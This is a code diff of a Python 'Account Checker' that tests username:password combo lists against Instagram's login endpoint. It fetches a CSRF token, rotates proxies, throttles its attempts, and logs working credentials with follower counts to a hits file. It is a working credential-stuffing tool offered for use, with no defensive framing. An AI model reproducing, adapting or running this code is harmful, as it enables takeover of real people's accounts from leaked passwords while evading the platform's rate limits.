@@ -705,62 +705,62 @@ class Main:
         
 
     def AccountChecker(self,combos):
-        #try:
-        link = 'https://www.instagram.com/accounts/login/'
-        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        try:
+            link = 'https://www.instagram.com/accounts/login/'
+            login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
-        curtime = int(datetime.now().timestamp())
+            curtime = int(datetime.now().timestamp())
 
-        get_headers = {
-            "cookie": "ig_cb=1" #if this cookie header is missing you will receive cookie errors
-        }
+            get_headers = {
+                "cookie": "ig_cb=1" #if this cookie header is missing you will receive cookie errors
+            }
 
-        response = requests.get(link,headers=get_headers)
+            response = requests.get(link,headers=get_headers)
 
-        csrf = response.cookies['csrftoken']
+            csrf = response.cookies['csrftoken']
 
-        payload = {
-            'username': combos.split('.')[0],
-            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,combos.split(':')[-1]),
-            'queryParams': {},
-            'optIntoOneTap': 'false'
-        }
+            payload = {
+                'username': combos.split('.')[0],
+                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{0}:{1}'.format(curtime,combos.split(':')[-1]),
+                'queryParams': {},
+                'optIntoOneTap': 'false'
+            }
 
-        login_header = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
-            "X-Requested-With": "XMLHttpRequest",
-            "Referer": "https://www.instagram.com/accounts/login/",
-            "x-csrftoken": csrf
-        }
+            login_header = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": csrf
+            }
 
-        login_response = ''
+            login_response = ''
 
-        if self.account_checker_use_proxies == 1:
-            login_response = requests.post(login_url, data=payload, headers=login_header,proxies=self.GetRandomProxy())
-        else:
-            login_response = requests.post(login_url, data=payload, headers=login_header)
-
-        json_data = json.loads(login_response.text)
-
-        if 'authenticated' in json_data:
-            if json_data['authenticated'] == True:
-                followers = self.GetInstaFollowersNum(combos.split(':')[0])
-                self.PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(combos.split(':'),combos.split(':')[-1],followers),Fore.GREEN,Fore.GREEN)
-                with open('Data/[Account Checker]/hits.txt','a') as f:
-                    f.write('{0}:{1}\n'.format(combos.split(':')[0],combos.split(':')[-1]))
-                with open('Data/[Account Checker]/detailed_hits.txt','a') as f:
-                    f.write('{0}:{1} FOLLOWERS: {2}'.format(combos.split(':')[0],combos.split(':')[-1],followers))
+            if self.account_checker_use_proxies == 1:
+                login_response = requests.post(login_url, data=payload, headers=login_header,proxies=self.GetRandomProxy())
             else:
-                self.PrintText('BAD','{0}:{1}'.format(combos.split(':')[0],combos.split(':')[-1]),Fore.RED,Fore.RED)
-                with open('Data/[Account Checker]/bads.txt','a') as f:
-                    f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split(':')[-1]))
-        else:
-            self.PrintText('ERROR','{0}:{1} -> {2}'.format(combos.split(':')[0],combos.split(':')[-1],json_data['message']),Fore.RED,Fore.RED)
+                login_response = requests.post(login_url, data=payload, headers=login_header)
 
-        if self.account_checker_timeout > 0:
-            time.sleep(self.account_checker_timeout)
-        #except:
-        #    self.AccountChecker(combos)
+            json_data = json.loads(login_response.text)
+
+            if 'authenticated' in json_data:
+                if json_data['authenticated'] == True:
+                    followers = self.GetInstaFollowersNum(combos.split(':')[0])
+                    self.PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(combos.split(':'),combos.split(':')[-1],followers),Fore.GREEN,Fore.GREEN)
+                    with open('Data/[Account Checker]/hits.txt','a') as f:
+                        f.write('{0}:{1}\n'.format(combos.split(':')[0],combos.split(':')[-1]))
+                    with open('Data/[Account Checker]/detailed_hits.txt','a') as f:
+                        f.write('{0}:{1} FOLLOWERS: {2}'.format(combos.split(':')[0],combos.split(':')[-1],followers))
+                else:
+                    self.PrintText('BAD','{0}:{1}'.format(combos.split(':')[0],combos.split(':')[-1]),Fore.RED,Fore.RED)
+                    with open('Data/[Account Checker]/bads.txt','a') as f:
+                        f.write('{0}:{1}\n'.format(combos.split('.')[0],combos.split(':')[-1]))
+            else:
+                self.PrintText('ERROR','{0}:{1} -> {2}'.format(combos.split(':')[0],combos.split(':')[-1],json_data['message']),Fore.RED,Fore.RED)
+
+            if self.account_checker_timeout > 0:
+                time.sleep(self.account_checker_timeout)
+        except:
+            self.AccountChecker(combos)
 
 if __name__ == '__main__':
     main = Main()
